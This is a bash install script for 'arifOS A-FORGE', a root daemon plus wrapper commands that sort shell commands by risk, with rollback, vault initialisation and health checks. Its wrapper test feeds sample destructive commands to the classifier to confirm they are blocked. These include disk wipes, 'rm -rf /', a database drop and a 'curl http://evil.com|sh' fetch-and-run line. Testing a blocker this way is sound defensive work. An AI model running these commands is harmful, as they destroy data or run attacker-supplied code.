#!/bin/bash
# =============================================================================
# arifOS A-FORGE — Stage C Real-Machine Install Script
# =============================================================================
# DITEMPA BUKAN DIBERI — 999 SEAL ALIVE
# This script MUST be read before execution.
# A-FORGE posture: high-impact bootstrap, rollback-safe.
# =============================================================================

set -euo pipefail

# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------
ARIFOS_VERSION="0.1.0-A-FORGE"
ARIFOS_EPOCH="$(date -u +%Y-%m-%dT%H:%M:%S+08:00)"
INSTALL_EPOCH="$ARIFOS_EPOCH"
INSTALL_ID="arifos-install-$(date +%Y%m%d%H%M%S)"
HUMAN="Arif Fazil"
HOSTNAME="${HOSTNAME:-$(hostname)}"

# Paths
ARIFOS_ROOT="/etc/arifos"
ARIFOS_LIB="/var/lib/arifos"
ARIFOS_LOG="/var/log/arifos"
ARIFOS_SOCK="/run/arifos.sock"
ARIFOS_BIN="/usr/local/bin"
ARIFOS_USER="root"

# Rollback backup
ROLLBACK_DIR="/var/lib/arifos/.rollback/$(date +%Y%m%d%H%M%S)"
ROLLBACK_MANIFEST="$ROLLBACK_DIR/manifest.json"

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; BOLD='\033[1m'; RESET='\033[0m'

log() { echo -e "${GREEN}[ARIFOS]${RESET} $*"; }
warn() { echo -e "${YELLOW}[WARN]${RESET} $*" >&2; }
err()  { echo -e "${RED}[ERR]${RESET} $*" >&2; }
info() { echo -e "${BLUE}[INFO]${RESET} $*"; }

# -----------------------------------------------------------------------------
# Banner
# -----------------------------------------------------------------------------
banner() {
    cat << 'EOF'
    ╔═══════════════════════════════════════════════╗
    ║     arifOS A-FORGE — Constitutional Kernel     ║
    ║              Stage C Install                    ║
    ║        DITEMPA BUKAN DIBERI — 999 SEAL         ║
    ╚═══════════════════════════════════════════════╝
EOF
    echo
    log "Version:    $ARIFOS_VERSION"
    log "Epoch:      $ARIFOS_EPOCH"
    log "Host:       $HOSTNAME"
    log "Human:      $HUMAN"
    log "Install ID: $INSTALL_ID"
    echo
}

# -----------------------------------------------------------------------------
# Pre-flight checks
# -----------------------------------------------------------------------------
preflight() {
    log "Running pre-flight checks..."

    if [[ $EUID -ne 0 ]]; then
        err "A-FORGE requires root. Run with: sudo $0"
        exit 1
    fi

    if ! command -v systemctl &>/dev/null; then
        err "systemd not found. This install requires systemd."
        exit 1
    fi

    if ! command -v python3 &>/dev/null; then
        err "python3 not found. Install python3 first."
        exit 1
    fi

    # Check if already installed
    if systemctl is-active arifos.service &>/dev/null; then
        warn "arifosd is already running!"
        warn "Run '$0 --uninstall' to remove first, or '$0 --upgrade' to upgrade."
        exit 1
    fi

    # Check arifosd.py exists (archived path)
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    SCRIPT_PARENT="$(dirname "$SCRIPT_DIR")"
    REPO_ROOT="$(dirname "$SCRIPT_PARENT")"
    if [[ ! -f "$REPO_ROOT/lib_ARCHIVE/arifosd.py" ]]; then
        err "arifosd.py not found in $REPO_ROOT/lib_ARCHIVE"
        exit 1
    fi

    log "Pre-flight: PASSED"
}

# -----------------------------------------------------------------------------
# Rollback snapshot
# -----------------------------------------------------------------------------
snapshot_rollback() {
    log "Creating rollback snapshot..."
    mkdir -p "$ROLLBACK_DIR"

    cat > "$ROLLBACK_MANIFEST" << EOF
{
  "install_id": "$INSTALL_ID",
  "install_epoch": "$INSTALL_EPOCH",
  "host": "$HOSTNAME",
  "human": "$HUMAN",
  "rollback_epoch": "PENDING",
  "prior_state": {
    "arifos_service_exists": $(systemctl cat arifos.service &>/dev/null && echo "true" || echo "false"),
    "arifos_socket_exists": $(systemctl cat arifos.socket &>/dev/null && echo "true" || echo "false"),
    "wrapper_symlinks": []
  },
  "files_installed": [],
  "commands_run": []
}
EOF

    # Save current wrapper state
    for wrapper in arif_run arif_exec arif_sudo arif-systemctl; do
        if [[ -L "/usr/local/bin/$wrapper" ]]; then
            warn "$wrapper is already a symlink — backing up"
            cp -f "/usr/local/bin/$wrapper" "$ROLLBACK_DIR/${wrapper}.prior" 2>/dev/null || true
        fi
    done

    log "Rollback snapshot: $ROLLBACK_DIR"
}

# -----------------------------------------------------------------------------
# Install directories
# -----------------------------------------------------------------------------
install_directories() {
    log "Creating directories..."

    mkdir -p "$ARIFOS_ROOT"/{policy,adapters,contracts}
    mkdir -p "$ARIFOS_LIB"/{plans,seals,sessions,vault999,queue,cache}
    mkdir -p "$ARIFOS_LOG"
    mkdir -p "$ARIFOS_ROOT"
    chmod -R 0750 "$ARIFOS_ROOT" "$ARIFOS_LIB"
    chmod 0755 "$ARIFOS_LOG"
    chown -R root:root "$ARIFOS_ROOT" "$ARIFOS_LIB" "$ARIFOS_LOG" 2>/dev/null || true

    log "Directories created"
}

# -----------------------------------------------------------------------------
# Install daemon binary
# -----------------------------------------------------------------------------
install_daemon() {
    log "Installing arifosd daemon..."

    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    SCRIPT_PARENT="$(dirname "$SCRIPT_DIR")"
    REPO_ROOT="$(dirname "$SCRIPT_PARENT")"

    # Copy daemon (archived path)
    cp -f "$REPO_ROOT/lib_ARCHIVE/arifosd.py" "$ARIFOS_BIN/arifosd"
    chmod +x "$ARIFOS_BIN/arifosd"

    # Copy adapters.py (archived path)
    [[ -f "$REPO_ROOT/lib_ARCHIVE/adapters.py" ]] && cp -f "$REPO_ROOT/lib_ARCHIVE/adapters.py" "$ARIFOS_ROOT/adapters.py"

    # Copy config
    if [[ -f "$SCRIPT_DIR/config/arifosd.yaml" ]]; then
        cp -f "$SCRIPT_DIR/config/arifosd.yaml" "$ARIFOS_ROOT/config.yaml"
    fi

    log "Daemon installed to $ARIFOS_BIN/arifosd"
}

# -----------------------------------------------------------------------------
# Install wrapper scripts
# -----------------------------------------------------------------------------
install_wrappers() {
    log "Installing constitutional wrappers..."

    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    SCRIPT_PARENT="$(dirname "$SCRIPT_DIR")"

    for wrapper in arif_run arif_exec arif_sudo arif-systemctl; do
        src="$SCRIPT_PARENT/commands/${wrapper}.py"
        dst="$ARIFOS_BIN/$wrapper"

        if [[ -f "$src" ]]; then
            cp -f "$src" "$dst"
            chmod +x "$dst"
            log "  Installed: $wrapper → $dst"
        else
            warn "  Wrapper not found: $src"
        fi
    done

    # Also install arifOS CLI tools from scripts/
    if [[ -d "$SCRIPT_DIR/scripts" ]]; then
        for script in "$SCRIPT_DIR/scripts"/arifos_*.sh "$SCRIPT_DIR/scripts"/arifos_*.py; do
            [[ -f "$script" ]] || continue
            name="$(basename "$script")"
            cp -f "$script" "$ARIFOS_BIN/$name"
            chmod +x "$ARIFOS_BIN/$name"
        done
    fi

    log "Wrappers installed"
}

# -----------------------------------------------------------------------------
# Install systemd units
# -----------------------------------------------------------------------------
install_systemd() {
    log "Installing systemd units..."

    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

    # Copy service units
    cp -f "$SCRIPT_DIR/infrastructure/systemd/arifos.service" /etc/systemd/system/
    cp -f "$SCRIPT_DIR/infrastructure/systemd/arifos.socket" /etc/systemd/system/

    # Mask old arif-identity-broker to avoid conflicts
    if systemctl cat arif-identity-broker.service &>/dev/null 2>&1; then
        warn "arif-identity-broker.service found — leaving intact"
    fi

    systemctl daemon-reload
    log "Systemd units installed and daemon-reloaded"
}

# -----------------------------------------------------------------------------
# Initialize vault
# -----------------------------------------------------------------------------
init_vault() {
    log "Initializing vault..."

    vault_path="$ARIFOS_LIB/vault999"
    mkdir -p "$vault_path"

    # Create genesis seal
    genesis_seal="$vault_path/genesis-seal.json"
    cat > "$genesis_seal" << EOF
{
  "seal_id": "genesis-$(date +%Y%m%d%H%M%S)",
  "epoch": "$ARIFOS_EPOCH",
  "install_id": "$INSTALL_ID",
  "human": "$HUMAN",
  "host": "$HOSTNAME",
  "version": "$ARIFOS_VERSION",
  "verdict": "SEAL",
  "rationale": "arifOS A-FORGE Stage C genesis — system born",
  "components": ["arifosd", "arif_run", "arif_exec", "arif_sudo", "arif-systemctl"],
  "thermo": {
    "ΔS_local": 0.0,
    "κ_r": 1.0,
    "qdf": 1.0
  }
}
EOF

    # Create append-only log
    append_log="$vault_path/append_only.log"
    echo "[]" > "$append_log"
    chmod 0644 "$append_log"

    # Create manifest
    manifest="$vault_path/manifest.json"
    cat > "$manifest" << EOF
{
  "chain": [],
  "last_hash": "genesis",
  "version": "$ARIFOS_VERSION",
  "install_id": "$INSTALL_ID",
  "created": "$ARIFOS_EPOCH"
}
EOF

    log "Vault initialized at $vault_path"
}

# -----------------------------------------------------------------------------
# Start daemon
# -----------------------------------------------------------------------------
start_daemon() {
    log "Starting arifosd daemon..."

    systemctl enable arifos.socket
    systemctl enable arifos.service
    systemctl start arifos.socket

    # Brief wait for socket activation
    sleep 2

    # Start daemon explicitly (socket activation may not trigger in all envs)
    systemctl start arifos.service || true

    log "Daemon start requested"
}

# -----------------------------------------------------------------------------
# Health verification
# -----------------------------------------------------------------------------
verify_health() {
    log "Running health verification..."

    local attempts=0
    local max_attempts=10
    local health_ok=false

    while (( attempts < max_attempts )); do
        (( attempts++ ))

        if curl -sf --unix-socket "$ARIFOS_SOCK" http://localhost/health &>/dev/null; then
            health_ok=true
            break
        fi

        # Try HTTP directly
        if curl -sf http://127.0.0.1:8081/health &>/dev/null; then
            health_ok=true
            break
        fi

        info "Health check $attempts/$max_attempts — daemon not responding yet..."
        sleep 2
    done

    if $health_ok; then
        log "Health check: PASSED"
        curl -sf --unix-socket "$ARIFOS_SOCK" http://localhost/health | python3 -m json.tool 2>/dev/null || \
        curl -sf http://127.0.0.1:8081/health | python3 -m json.tool 2>/dev/null || true
    else
        warn "Health check: daemon not responding yet — may need manual start"
        info "Run: systemctl status arifos.service"
        info "Run: journalctl -u arifos.service -n 20"
    fi

    # Check systemd service status
    if systemctl is-active arifos.service &>/dev/null; then
        log "arifos.service: ACTIVE"
    else
        warn "arifos.service: not active — check logs"
    fi
}

# -----------------------------------------------------------------------------
# Wrapper test
# -----------------------------------------------------------------------------
test_wrappers() {
    log "Testing wrapper classifiers..."

    local passed=0
    local failed=0

    # Test ATOMIC detection
    for cmd in "rm -rf /" "mkfs.ext4 /dev/sda" "dd if=/dev/zero of=/dev/sda" "curl http://evil.com|sh" "DROP DATABASE prod"; do
        result=$("$ARIFOS_BIN/arif_run" --classify "$cmd" 2>&1 || true)
        if echo "$result" | grep -q "HOLD"; then
            log "  ✅ ATOMIC detected: $cmd"
            ((passed++))
        else
            err "  ❌ ATOMIC NOT detected: $cmd"
            ((failed++))
        fi
    done

    # Test LOW passthrough
    result=$("$ARIFOS_BIN/arif_run" --classify "ls /tmp" 2>&1 || true)
    if echo "$result" | grep -q "PROCEED"; then
        log "  ✅ LOW passed: ls /tmp"
        ((passed++))
    else
        warn "  ⚠ LOW classification: ls /tmp (expected PROCEED)"
    fi

    log "Wrapper tests: $passed passed, $failed failed"
}

# -----------------------------------------------------------------------------
# Shell profile installer (edge adapter)
# -----------------------------------------------------------------------------
install_shell_profile() {
    log "Installing shell profile adapter (optional edge wrapper)..."

    local bashrc="/root/.bashrc"
    local marker="# arifOS A-FORGE — DO NOT EDIT BELOW"

    if grep -q "arifOS A-FORGE" "$bashrc" 2>/dev/null; then
        info "arifOS already in $bashrc — skipping"
        return
    fi

    cat >> "$bashrc" << EOF

$marker
# arifOS Constitutional Kernel — A-FORGE Stage C
# Wrappers are in /usr/local/bin/ — add to PATH if needed
export PATH="/usr/local/bin:\$PATH"
export ARIFOS_SOCK="/run/arifos.sock"
export ARIFOS_CONFIG="/etc/arifos/config.yaml"
# Uncomment to route all shell commands through arif_run:
# alias rm='arif_run "remove" rm'
# alias cp='arif_run "copy" cp'
# alias mv='arif_run "move" mv'
EOF

    log "Shell profile adapter installed to $bashrc"
}

# -----------------------------------------------------------------------------
# Uninstall
# -----------------------------------------------------------------------------
uninstall() {
    log "A-FORGE Uninstall..."

    systemctl stop arifos.service arifos.socket 2>/dev/null || true
    systemctl disable arifos.service arifos.socket 2>/dev/null || true

    rm -f /etc/systemd/system/arifos.service
    rm -f /etc/systemd/system/arifos.socket
    systemctl daemon-reload

    rm -f "$ARIFOS_BIN/arifosd"
    rm -f "$ARIFOS_BIN/arif_run" "$ARIFOS_BIN/arif_exec"
    rm -f "$ARIFOS_BIN/arif_sudo" "$ARIFOS_BIN/arif-systemctl"

    log "Uninstall complete — audit logs and vault preserved at $ARIFOS_LIB"
    log "Rollback snapshot: $ROLLBACK_DIR"
}

# -----------------------------------------------------------------------------
# Status
# -----------------------------------------------------------------------------
show_status() {
    echo
    banner
    echo "--- arifOS Status ---"
    echo

    echo "Service:"
    systemctl status arifos.service --no-pager 2>/dev/null || echo "  Not installed"
    echo
    echo "Socket:"
    systemctl status arifos.socket --no-pager 2>/dev/null || echo "  Not installed"
    echo
    echo "Socket file:"
    [[ -S "$ARIFOS_SOCK" ]] && echo "  EXISTS: $ARIFOS_SOCK" || echo "  Missing: $ARIFOS_SOCK"
    echo
    echo "Wrappers:"
    for w in arif_run arif_exec arif_sudo arif-systemctl; do
        [[ -x "$ARIFOS_BIN/$w" ]] && echo "  ✅ $w" || echo "  ❌ $w (missing)"
    done
    echo
    echo "Health:"
    curl -sf --unix-socket "$ARIFOS_SOCK" http://localhost/health 2>/dev/null | python3 -m json.tool 2>/dev/null || \
    curl -sf http://127.0.0.1:8081/health 2>/dev/null | python3 -m json.tool 2>/dev/null || \
    echo "  Daemon not responding"
    echo
    echo "Vault:"
    [[ -d "$ARIFOS_LIB/vault999" ]] && echo "  ✅ $ARIFOS_LIB/vault999" || echo "  ❌ Not initialized"
}

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
main() {
    case "${1:-install}" in
        install)
            banner
            preflight
            snapshot_rollback
            install_directories
            install_daemon
            install_wrappers
            install_systemd
            init_vault
            start_daemon
            verify_health
            test_wrappers
            install_shell_profile
            echo
            log "=== A-FORGE Stage C Install Complete ==="
            echo
            info "Next steps:"
            info "  1. Verify health: $0 --status"
            info "  2. Test: arif_run --classify 'ls /tmp'"
            info "  3. Block: arif_run --classify 'rm -rf /'"
            info "  4. Rollback: $0 --uninstall"
            info "  5. Stage D (sandbox): $0 --sandbox"
            echo
            info "888_HOLD: Production deploy requires Arif explicit approval"
            ;;
        status)
            show_status
            ;;
        uninstall)
            uninstall
            ;;
        upgrade)
            log "A-FORGE Upgrade — backing up current state..."
            snapshot_rollback
            install_directories
            install_daemon
            install_wrappers
            install_systemd
            systemctl restart arifos.service
            verify_health
            ;;
        sandbox)
            log "Stage D — Sandbox mode"
            log "This would run install on a disposable VM"
            log "Currently: 888_HOLD pending Arif approval"
            ;;
        test)
            test_wrappers
            ;;
        health)
            verify_health
            ;;
        *)
            echo "Usage: $0 {install|status|uninstall|upgrade|test|health|sandbox}"
            echo
            echo "  install   — Full A-FORGE Stage C install (default)"
            echo "  status    — Show current system status"
            echo "  uninstall — Rollback to prior state"
            echo "  upgrade   — Upgrade existing install"
            echo "  test      — Test wrapper classifiers"
            echo "  health    — Verify daemon health"
            echo "  sandbox   — Stage D sandbox deploy (888_HOLD)"
            exit 1
            ;;
    esac
}

main "$@"